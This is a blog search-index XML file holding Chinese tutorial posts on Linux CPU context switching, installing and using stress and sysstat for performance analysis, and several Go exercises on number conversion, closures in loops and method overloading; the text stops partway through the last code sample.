<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CPU_上下文切换是什么意思</title>
      <link href="/2022/06/20/CPU_%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D/"/>
      <url>/2022/06/20/CPU_%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D/</url>
      
        <content type="html"><![CDATA[<h2 id="CPU上下文"><a href="#CPU上下文" class="headerlink" title="CPU上下文"></a>CPU上下文</h2><p>CPU 寄存器，是 CPU 内置的容量小、但速度极快的内存。而程序计数器，则是用来存储 CPU 正在执行的指令位置、或者即将执行的下一条指令位置。它们都是 CPU 在运行任何任务前，必须的依赖环境，因此也被叫做 <strong>CPU 上下文</strong>。<br><img src="http://106.12.125.218/medias/medias/CPU_%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D/0.png"><br>CPU 上下文切换，就是先把前一个任务的 CPU 上下文（也就是 CPU 寄存器和程序计数器）保存起来，然后加载新任务的上下文到这些寄存器和程序计数器，最后再跳转到程序计数器所指的新位置，运行新任务。<br>而这些保存下来的上下文，会存储在系统内核中，并在任务重新调度执行时再次加载进来。这样就能保证任务原来的状态不受影响，让任务看起来还是连续运行。</p><h2 id="进程上下文切换"><a href="#进程上下文切换" class="headerlink" title="进程上下文切换"></a>进程上下文切换</h2><p>Linux 按照特权等级，把进程的运行空间分为内核空间和用户空间，分别对应着下图中， CPU 特权等级的 Ring 0 和 Ring 3。</p><ul><li>内核空间（Ring 0）具有最高权限，可以直接访问所有资源；</li><li>用户空间（Ring 3）只能访问受限资源，不能直接访问内存等硬件设备，必须通过系统调用陷入到内核中，才能访问这些特权资源。</li></ul><p><img src="http://106.12.125.218/medias/medias/CPU_%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D/1.png"><br>换个角度看，也就是说，进程既可以在用户空间运行，又可以在内核空间中运行。进程在用户空间运行时，被称为进程的用户态，而陷入内核空间的时候，被称为进程的内核态。<br>从用户态到内核态的转变，需要通过<strong>系统调用</strong>来完成。<br>系统调用的过程中也会发生cpu的上下文切换，<br>CPU 寄存器里原来用户态的指令位置，需要先保存起来。接着，为了执行内核态代码，CPU 寄存器需要更新为内核态指令的新位置。最后才是跳转到内核态运行内核任务。<br>而系统调用结束后，CPU 寄存器需要<strong>恢复</strong>原来保存的用户态，然后再切换到用户空间，继续运行进程。所以，一次系统调用的过程，其实是发生了两次 CPU 上下文切换。<br>不过，需要注意的是，系统调用过程中，并不会涉及到虚拟内存等进程用户态的资源，也不会切换进程。这跟我们通常所说的进程上下文切换是不一样的：</p><ul><li>进程上下文切换，是指从一个进程切换到另一个进程运行。</li><li>而系统调用过程中一直是同一个进程在运行。</li></ul><p>因此，进程的上下文切换就比系统调用时多了一步：在保存当前进程的内核状态和 CPU 寄存器之前，需要先把该进程的虚拟内存、栈等保存下来；而加载了下一进程的内核态后，还需要刷新进程的虚拟内存和用户栈。<br>如下图所示，保存上下文和恢复上下文的过程并不是“免费”的，需要内核在 CPU 上运行才能完成。<br><img src="http://106.12.125.218/medias/medias/CPU_%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D/2.png"></p><h3 id="什么时候发生进程调度"><a href="#什么时候发生进程调度" class="headerlink" title="什么时候发生进程调度"></a>什么时候发生进程调度</h3><ol><li>其一，为了保证所有进程可以得到公平调度，CPU 时间被划分为一段段的时间片，这些时间片再被轮流分配给各个进程。这样，当某个进程的时间片耗尽了，就会被系统挂起，切换到其它正在等待 CPU 的进程运行。</li><li>其二，进程在系统资源不足（比如内存不足）时，要等到资源满足后才可以运行，这个时候进程也会被挂起，并由系统调度其他进程运行。</li><li>其三，当进程通过睡眠函数 sleep 这样的方法将自己主动挂起时，自然也会重新调度。</li><li>其四，当有优先级更高的进程运行时，为了保证高优先级进程的运行，当前进程会被挂起，由高优先级进程来运行。</li><li>最后一个，发生硬件中断时，CPU 上的进程会被中断挂起，转而执行内核中的中断服务程序。</li></ol><h2 id="线程上下文切换"><a href="#线程上下文切换" class="headerlink" title="线程上下文切换"></a>线程上下文切换</h2><p>线程与进程最大的区别在于，<strong>线程是调度的基本单位，而进程则是资源拥有的基本单位</strong>。说白了，所谓内核中的任务调度，实际上的调度对象是线程；而进程只是给线程提供了虚拟内存、全局变量等资源。所以，对于线程和进程，我们可以这么理解：</p><ul><li>当进程只有一个线程时，可以认为进程就等于线程。</li><li><strong>当进程拥有多个线程时，这些线程会共享相同的虚拟内存和全局变量等资源。这些资源在上下文切换时是不需要修改的。</strong></li><li>另外，线程也有自己的私有数据，比如栈和寄存器等，这些在上下文切换时也是需要保存的。</li></ul><p>这么一来，线程的上下文切换其实就可以分为两种情况：</p><ol><li>第一种， 前后两个线程属于不同进程。此时，因为资源不共享，所以切换过程就跟进程上下文切换是一样。</li><li>第二种，前后两个线程属于同一个进程。此时，因为虚拟内存是共享的，所以在切换时，虚拟内存这些资源就保持不动，只需要切换线程的私有数据、寄存器等不共享的数据。</li></ol><p>到这里你应该也发现了，虽然同为上下文切换，但同进程内的线程切换，要比多进程间的切换消耗更少的资源，而这，也正是多线程代替多进程的一个优势。</p><h2 id="中断上下文切换"><a href="#中断上下文切换" class="headerlink" title="中断上下文切换"></a>中断上下文切换</h2><p>为了快速响应硬件的事件，<strong>中断处理会打断进程的正常调度和执行</strong>，转而调用中断处理程序，响应设备事件。而在打断其他进程时，就需要将进程当前的状态保存下来，这样在中断结束后，进程仍然可以从原来的状态恢复运行。<br>中断上下文切换并不涉及到进程的用户态。所以，即便中断过程打断了一个正处在用户态的进程，也不需要保存和恢复这个进程的虚拟内存、全局变量等用户态资源。中断上下文，其实只包括内核态中断服务程序执行所必需的状态，包括 CPU 寄存器、内核堆栈、硬件中断参数等。<br><strong>对同一个 CPU 来说，中断处理比进程拥有更高的优先级</strong>，所以中断上下文切换并不会与进程上下文切换同时发生。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>CPU 上下文切换，是保证 Linux 系统正常工作的核心功能之一，一般情况下不需要我们特别关注。</li><li>但过多的上下文切换，会把 CPU 时间消耗在寄存器、内核栈以及虚拟内存等数据的保存和恢复上，从而缩短进程真正运行的时间，导致系统的整体性能大幅下降。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux安装压测工具stress</title>
      <link href="/2022/06/20/Linux%E5%AE%89%E8%A3%85%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7stress/"/>
      <url>/2022/06/20/Linux%E5%AE%89%E8%A3%85%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7stress/</url>
      
        <content type="html"><![CDATA[<h2 id="stress简介"><a href="#stress简介" class="headerlink" title="stress简介"></a>stress简介</h2><p>stress是一个linux下的<a href="https://so.csdn.net/so/search?q=%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020">压力测试</a>工具，专门为那些想要测试自己的系统，完全高负荷和监督这些设备运行的用户。<br>但是在centos的yum源中并未找到此包，所以需要手动下载安装。</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="http://archlinux.mirror.beocat.ksu.edu/other/community/stress/stress-1.0.4.tar.gz">点击下载</a><br>依次执行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf stress<span class="number">-1.0</span><span class="number">.4</span>.tar.gz</span><br><span class="line">cd stress<span class="number">-1.0</span><span class="number">.4</span>/</span><br><span class="line">./configure</span><br><span class="line"><span class="built_in">make</span></span><br><span class="line"><span class="built_in">make</span> check</span><br><span class="line"><span class="built_in">make</span> install #用root权限</span><br></pre></td></tr></table></figure><p>之后输入stress，安装成功会显示如图stress说明及使用帮助<br><img src="http://106.12.125.218/medias/medias/Linux%E5%AE%89%E8%A3%85%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7stress/0.png"></p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux安装性能工具sysstat</title>
      <link href="/2022/06/20/Linux%E5%AE%89%E8%A3%85%E6%80%A7%E8%83%BD%E5%B7%A5%E5%85%B7sysstat/"/>
      <url>/2022/06/20/Linux%E5%AE%89%E8%A3%85%E6%80%A7%E8%83%BD%E5%B7%A5%E5%85%B7sysstat/</url>
      
        <content type="html"><![CDATA[<h2 id="简介及安装"><a href="#简介及安装" class="headerlink" title="简介及安装"></a>简介及安装</h2><p>sysstat 包含了常用的 Linux 性能工具，用来监控和分析系统的性能。</p><ul><li>mpstat 是一个常用的多核 CPU 性能分析工具，用来实时查看每个 CPU 的性能指标，以及所有 CPU 的平均指标。</li><li>pidstat 是一个常用的进程性能分析工具，用来实时查看进程的 CPU、内存、I/O 以及上下文切换等性能指标。</li></ul><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><code>yum install sysstat</code></p><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><h3 id="场景一：CPU-密集型进程"><a href="#场景一：CPU-密集型进程" class="headerlink" title="场景一：CPU 密集型进程"></a>场景一：CPU 密集型进程</h3><p>首先，我们在第一个终端运行 stress 命令，模拟一个 CPU 使用率 100% 的场景：<br><code>stress --cpu 1 --timeout 600</code><br><img src="http://106.12.125.218/medias/medias/Linux%E5%AE%89%E8%A3%85%E6%80%A7%E8%83%BD%E5%B7%A5%E5%85%B7sysstat/0.png"><br>接着，在第二个终端运行 uptime 查看平均负载的变化情况：<br><code>watch -d uptime</code><br><img src="http://106.12.125.218/medias/medias/Linux%E5%AE%89%E8%A3%85%E6%80%A7%E8%83%BD%E5%B7%A5%E5%85%B7sysstat/1.png"><br>最后，在第三个终端运行 mpstat 查看 CPU 使用率的变化情况：<br><code>mpstat -P ALL 5</code><br><img src="http://106.12.125.218/medias/medias/Linux%E5%AE%89%E8%A3%85%E6%80%A7%E8%83%BD%E5%B7%A5%E5%85%B7sysstat/2.png"><br>那么，到底是哪个进程导致了 CPU 使用率为 100% 呢？你可以使用 pidstat 来查询：<br><code>pidstat -u 5 1000</code><br><img src="http://106.12.125.218/medias/medias/Linux%E5%AE%89%E8%A3%85%E6%80%A7%E8%83%BD%E5%B7%A5%E5%85%B7sysstat/3.png"><br>从这里可以明显看到，stress 进程的 CPU 使用率为 100%。</p><h3 id="模拟其他场景"><a href="#模拟其他场景" class="headerlink" title="模拟其他场景"></a>模拟其他场景</h3><h4 id="I-O-密集型进程"><a href="#I-O-密集型进程" class="headerlink" title="I/O 密集型进程"></a>I/O 密集型进程</h4><p>模拟 I/O 压力，即不停地执行 sync：<br><code>stress -i 1 --timeout 600</code></p><h4 id="大量进程的场景"><a href="#大量进程的场景" class="headerlink" title="大量进程的场景"></a>大量进程的场景</h4><p>当系统中运行进程超出 CPU 运行能力时，就会出现等待 CPU 的进程。<br>比如，我们还是使用 stress，但这次模拟的是 8 个进程：<br><code>stress -c 8 --timeout 600</code></p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go算法题整理之随便整理</title>
      <link href="/2022/06/19/go%E7%AE%97%E6%B3%95%E9%A2%98%E6%95%B4%E7%90%86%E4%B9%8B%E9%9A%8F%E4%BE%BF%E6%95%B4%E7%90%86/"/>
      <url>/2022/06/19/go%E7%AE%97%E6%B3%95%E9%A2%98%E6%95%B4%E7%90%86%E4%B9%8B%E9%9A%8F%E4%BE%BF%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h3 id="10进制转化成x进制表示"><a href="#10进制转化成x进制表示" class="headerlink" title="10进制转化成x进制表示"></a>10进制转化成x进制表示</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将十进制数字转化为二进制字符串</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">convertToBin</span><span class="params">(num <span class="keyword">int</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">s := <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> num == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// num /= 2 每次循环的时候 都将num除以2  再把结果赋值给 num</span></span><br><span class="line"><span class="keyword">for</span> ; num &gt; <span class="number">0</span>; num /= <span class="number">2</span> &#123;</span><br><span class="line">lsb := num % <span class="number">2</span></span><br><span class="line"><span class="comment">// strconv.Itoa() 将数字强制性转化为字符串</span></span><br><span class="line">s = strconv.Itoa(lsb) + s</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">tmp := convertToBin(<span class="number">18</span>)</span><br><span class="line">fmt.Println(tmp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术栈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go分析题之for循环里执行协程，打印i值</title>
      <link href="/2022/06/13/go%E5%88%86%E6%9E%90%E9%A2%98%E4%B9%8Bfor%E5%BE%AA%E7%8E%AF%E9%87%8C%E6%89%A7%E8%A1%8C%E5%8D%8F%E7%A8%8B%EF%BC%8C%E6%89%93%E5%8D%B0i%E5%80%BC/"/>
      <url>/2022/06/13/go%E5%88%86%E6%9E%90%E9%A2%98%E4%B9%8Bfor%E5%BE%AA%E7%8E%AF%E9%87%8C%E6%89%A7%E8%A1%8C%E5%8D%8F%E7%A8%8B%EF%BC%8C%E6%89%93%E5%8D%B0i%E5%80%BC/</url>
      
        <content type="html"><![CDATA[<h2 id="情况一"><a href="#情况一" class="headerlink" title="情况一"></a>情况一</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(i)</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时的输出理论上&gt;6的5次方种可能性，因为go闭包里面的i是对外面i的引用，执行的时候i的值可能是0,1,2,3,4,5</p><h3 id="情况一补充"><a href="#情况一补充" class="headerlink" title="情况一补充"></a>情况一补充</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(i)</span><br><span class="line">&#125;()</span><br><span class="line">time.Sleep(<span class="number">10000000</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>每次for循环都等协程一会，这样输出的就是0 1 2 3 4 了</p><h2 id="情况二"><a href="#情况二" class="headerlink" title="情况二"></a>情况二</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(i)</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时打印出来的就是 5 5 5 5 5 了</p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go能重载吗</title>
      <link href="/2022/06/13/go%E8%83%BD%E9%87%8D%E8%BD%BD%E5%90%97/"/>
      <url>/2022/06/13/go%E8%83%BD%E9%87%8D%E8%BD%BD%E5%90%97/</url>
      
        <content type="html"><![CDATA[<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Person类型，实现了一个方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tmp *Person)</span> <span class="title">PrintInfo</span><span class="params">(i <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;name=%s, sex=%c, age=%d\n&quot;</span>, tmp.name, tmp.sex, tmp.age)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">name <span class="keyword">string</span></span><br><span class="line">sex  <span class="keyword">rune</span></span><br><span class="line">age  <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//有个学生，继承Person字段，成员和方法都继承了</span></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">Person <span class="comment">//匿名字段</span></span><br><span class="line">id     <span class="keyword">int</span></span><br><span class="line">addr   <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Student也实现了一个方法，这个方法和Person方法同名，这种方法叫重写</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tmp *Student)</span> <span class="title">PrintInfo</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Student: tmp = &quot;</span>, tmp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s := Student&#123;Person&#123;<span class="string">&quot;mike&quot;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="number">18</span>&#125;, <span class="number">666</span>, <span class="string">&quot;bj&quot;</span>&#125;</span><br><span class="line"><span class="comment">//就近原则：先找本作用域的方法，找不到再用继承的方法，</span></span><br><span class="line">    <span class="comment">//实际上这里也没法用继承的方法，因为和继承的方法同名了,直接把继承的方法重写了</span></span><br><span class="line">s.PrintInfo(<span class="string">&quot;1&quot;</span>) <span class="comment">//到底调用的是Person， 还是Student， 结论是Student</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//显式调用继承的方法</span></span><br><span class="line">s.Person.PrintInfo(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上代码无法执行,因为参数类型不对,那定义个同名不同参的函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Person类型，实现了一个方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tmp *Person)</span> <span class="title">PrintInfo</span><span class="params">(i <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;name=%s, sex=%c, age=%d\n&quot;</span>, tmp.name, tmp.sex, tmp.age)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">name <span class="keyword">string</span></span><br><span class="line">sex  <span class="keyword">rune</span></span><br><span class="line">age  <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//有个学生，继承Person字段，成员和方法都继承了</span></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">Person <span class="comment">//匿名字段</span></span><br><span class="line">id     <span class="keyword">int</span></span><br><span class="line">addr   <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Student也实现了一个方法，这个方法和Person方法同名，这种方法叫重写</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tmp *Student)</span> <span class="title">PrintInfo</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Student: tmp = &quot;</span>, tmp)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tmp *Student)</span> <span class="title">PrintInfo</span><span class="params">(i <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Student: tmp = &quot;</span>, tmp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s := Student&#123;Person&#123;<span class="string">&quot;mike&quot;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="number">18</span>&#125;, <span class="number">666</span>, <span class="string">&quot;bj&quot;</span>&#125;</span><br><span class="line"><span class="comment">//就近原则：先找本作用域的方法，找不到再用继承的方法</span></span><br><span class="line">s.PrintInfo(<span class="string">&quot;1&quot;</span>) <span class="comment">//到底调用的是Person， 还是Student， 结论是Student</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//显式调用继承的方法</span></span><br><span class="line">s.Person.PrintInfo(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还是不行，说明不支持重载<br>对父类方法的重写是可以的，如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Person类型，实现了一个方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tmp *Person)</span> <span class="title">PrintInfo</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;name=%s, sex=%c, age=%d\n&quot;</span>, tmp.name, tmp.sex, tmp.age)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">name <span class="keyword">string</span></span><br><span class="line">sex  <span class="keyword">rune</span></span><br><span class="line">age  <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//有个学生，继承Person字段，成员和方法都继承了</span></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">Person <span class="comment">//匿名字段</span></span><br><span class="line">id     <span class="keyword">int</span></span><br><span class="line">addr   <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Student也实现了一个方法，这个方法和Person方法同名，这种方法叫重写</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tmp 